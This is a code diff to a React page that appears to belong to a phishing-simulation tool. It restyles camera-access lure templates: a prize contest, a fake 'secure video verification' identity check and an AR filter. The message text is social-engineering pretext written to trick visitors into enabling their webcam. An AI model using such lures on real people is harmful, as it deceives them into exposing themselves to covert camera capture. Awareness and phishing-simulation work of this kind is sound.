@@ -5,25 +5,29 @@ import { useParams } from 'next/navigation';
 import { useLogs } from '@/contexts/LogContext';
 import type { CameraData } from '@/types';
 import { Button } from '@/components/ui/button';
-import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
-import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
-import { cn } from '@/lib/utils'; // Added for cn utility
+import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
+import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react'; // Added ShieldCheck, Sparkles, Wand2
+import { cn } from '@/lib/utils';
 
-const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
+const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; visual?: React.ReactNode; headerClassName?: string; }> = {
   'photo-contest-entry': {
-    title: 'Capture the Moment: Photo Contest!',
+    title: 'SnapWin Contest!',
     message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
     cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
+    visual: <Trophy className="h-12 w-12 text-amber-400 mr-3" />,
+    headerClassName: "bg-gradient-to-r from-yellow-400 via-red-500 to-pink-500 p-4 rounded-t-lg text-white",
   },
   'video-verification': {
-    title: 'Video Verification',
+    title: 'Secure Video Verification',
     actionText: 'Start Video Verification',
     message: 'For security, we need to verify your identity via video. Please enable your camera.',
+    visual: <ShieldCheck className="h-8 w-8 text-blue-600 mr-2" />,
   },
   'ar-filter': {
-    title: 'Try Our New AR Filter!',
+    title: 'Magical AR Filter Fun!',
     actionText: 'Test AR Filter',
     message: 'Check out our latest AR filter! Enable your camera to see it in action.',
+    visual: <><Wand2 className="h-8 w-8 text-purple-500 mr-1" /><Sparkles className="h-6 w-6 text-yellow-400" /></>,
   },
   default: {
     title: 'Camera Access Required',
@@ -154,14 +158,15 @@ export default function CameraPhishingPage() {
       <>
         <PhishingPageLayout
           title={content.title}
-          isLoading={isLoading && status !== 'streaming' && cookieConsentGiven}
-          error={error}
-          statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
+          // className={content.headerClassName ? 'pt-0' : ''} // Example of using className for layout adjustment
         >
-          <div className="text-center mb-6">
-              <Trophy className="h-16 w-16 text-amber-500 mx-auto mb-4" />
-              <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
+          <div className={cn("text-center mb-6", content.headerClassName)}>
+            <div className="flex items-center justify-center p-4">
+              {content.visual}
+              <h1 className={cn("text-2xl font-bold", content.headerClassName ? 'text-white' : '')}>{content.title}</h1>
+            </div>
           </div>
+          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
           
           <div className={cn(
               "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
@@ -235,10 +240,14 @@ export default function CameraPhishingPage() {
   return (
     <PhishingPageLayout
         title={content.title}
-        isLoading={isLoading && status !== 'streaming'}
-        error={error}
-        statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
+        // isLoading={isLoading && status !== 'streaming'} // Removed
+        // error={error} // Removed
+        // statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined} // Removed
     >
+      <div className="flex items-center justify-center mb-2">
+        {content.visual}
+        <h1 className="text-2xl font-bold text-center">{content.title}</h1>
+      </div>
       <p className="text-center text-muted-foreground mb-6">{content.message}</p>
 
       <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
